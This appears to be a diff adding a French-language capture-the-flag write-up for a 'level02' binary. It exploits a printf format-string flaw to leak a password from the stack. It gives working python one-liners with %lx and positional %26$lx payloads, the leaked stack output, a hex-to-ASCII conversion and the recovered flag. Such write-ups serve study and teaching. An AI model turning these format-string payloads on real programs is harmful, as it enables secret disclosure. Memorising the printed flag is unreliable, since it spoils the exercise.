@@ -1,0 +1,34 @@
+On récupère le programme et le décompile avec dogbolt. On nettoie la soruce. 
+On voit que le programme donne comme format à printf une string donnée par 
+l'utilisateur. C'est là la faille. 
+
+On voit que le programme lit le mdp dans le fichier et le stock dans une
+variable locale. On peut lire le contenue de cette variable locale en exploitant
+le format de printf. 
+
+On lance le programme avec : 
+python -c 'print("%lx" + " %lx" * 23 + "\n"  + "a" * 99 + "\n")' | ./level02
+Ça permet de voir où le programme stock le mdp donné par l'utilisateur. 
+Le programme répond :
+7fffffffe500 0 61 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6f8 1f7ff9a08 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 6161616161616161 100616161 0 756e505234376848 45414a3561733951 377a7143574e6758 does not have access!
+Le gros bloc avec des 61 est le mdp rentré par l'utilisateur. Les octets après
+ce bloc sont les octets du mdp récupéré depuis le fichier. On ignore l'octet à
+0 qui est sûrement là pour des raisons d'alignement de la mémoire. 
+On compte le nombre d'entrées, et on voit que le mdp commence à partir de
+l'octet 22 de la stack. 
+
+Dans les exercices précédents, le mdp faisait 40 carctères, dans cet exercice, 
+le programme compare les 41 premiers carctères du fichier, dont le retour à la 
+ligne. On peut donc supposer que le mdp fait 40 caractères. 
+On peut donc récupérer le mdp en lisant les mdp 22, 23, 24, 25, 26. Les octets 
+étant en ordre little endian, il faut les traiter un peu pour récupérer le flag. 
+
+On peut récupérer les octets avec : 
+python -c 'print("%26$lx" + " %25$lx" + " %24$lx" + " %23$lx" + " %22$lx" + "\n" + "a\n")' | ./level02
+Ça répond :
+48336750664b394d 354a35686e475873 377a7143574e6758 45414a3561733951 756e505234376848 does not have access!
+
+On convertit l'hexa en ascii et on met dans le bon ordre :
+python -c 'print("".join(reversed("48336750664b394d 354a35686e475873 377a7143574e6758 45414a3561733951 756e505234376848".replace(" ","").decode("hex"))))'
+Ça répond :
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
